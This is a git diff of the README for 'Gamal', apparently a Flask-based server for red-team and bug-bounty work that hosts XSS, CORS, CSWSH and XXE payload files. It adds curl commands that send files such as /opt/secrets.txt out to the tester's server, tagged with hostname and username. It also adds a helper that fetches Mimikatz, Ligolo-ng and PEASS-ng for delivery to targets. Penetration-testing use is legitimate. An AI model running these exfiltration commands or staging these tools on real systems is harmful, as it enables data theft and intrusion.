@@ -1,7 +1,8 @@
 # Gamal
+
 A tiny flask app for helping pentesters, red-teamers and bug hunters in data exfileration, SSRF, XSS, Session Hijacking, Session Riding and Cookie Thieve.
 
-## Install & usage:
+## Install & usage
 
 ```bash
 cd /opt
@@ -17,11 +18,12 @@ or
 
 `python3 gamal.py --ip <IPADDR> --port <PORTNUM> --log <LOGPATH> --canary <YourCanaryString> [--cert <FullChain> --key <PrivateKey>]`
 
-Then you can use your IP & Port in your SSRF XSS | XXE | Open-Redirect | Etc. payloads.
+Then you can use your IP & Port in your payloads.
 
-***Note:*** Add your files in `/f` folder ==>  `http://IP:PORT/f/<Your-FileName>` 
+***Note:*** Add your files in `/f` folder ==>  `http://IP:PORT/f/<Your-FileName>`
 
-## Paylods:
+## Paylods
+
 `/f/xss.js` XSS Sample function
 
 `/f/CORS.html` CORS sample script
@@ -30,7 +32,7 @@ Then you can use your IP & Port in your SSRF XSS | XXE | Open-Redirect | Etc. pa
 
 `/f/CSWSH.html` Cross-Site WebSocket Hijacking (CSWSH) script
 
-`/f/meta.jpg` XSS in Meta-data 
+`/f/meta.jpg` XSS in Meta-data
 
 `/f/EBXXE.dtd` XXE .dtd sample file
 
@@ -38,10 +40,31 @@ Then you can use your IP & Port in your SSRF XSS | XXE | Open-Redirect | Etc. pa
 
 ## Data exfiltration
 
-Linux / MacOS:
+### Linux / MacOS
 
 `curl -k -F "file=@<PathToYourFile>" https://<GamalIP>:<GamalPort>/e/upload`
 
-Windows:
+### Windows
 
-`Remove-Item alias:curl; curl -k -F "file=@C:\<PathToYourFile>" https://<GamalIP>:<GamalPort>/e/upload`
+`Remove-Item alias:curl -ErrorAction SilentlyContinue; curl -k -F "file=@C:\<PathToYourFile>" https://<GamalIP>:<GamalPort>/e/upload`
+
+### Special Parameters
+
+If you use `user` and `host` parameters in the upload URL, they will be used in the file name. It'll help you identify the owner of the files more easily. Example:
+
+```bash
+ curl -k -F "file=/opt/secrets.txt" "https://127.0.0.1:1337/e/upload?host=$(hostname)&user=$(id -un)"
+```
+
+outputfile:
+`{host}--{user}--{request.remote_addr}--{random-uuid4}-{RealFileName}`
+
+## Gamal helper script
+
+It downloads and categorizes the most common tools for delivering to the targets (Windows / Linux / macOS)
+
+- [Mimikatz](https://github.com/gentilkiwi/mimikatz/)
+- [SharpCollection](https://github.com/Flangvik/SharpCollection/) -- Read the README file before you use them in your operations.
+- [Ligolo-ng](https://github.com/nicocha30/ligolo-ng/) -- agent and proxy
+- [PEASS-ng](https://github.com/peass-ng/PEASS-ng/)
+- [AzureHound](https://github.com/SpecterOps/AzureHound)
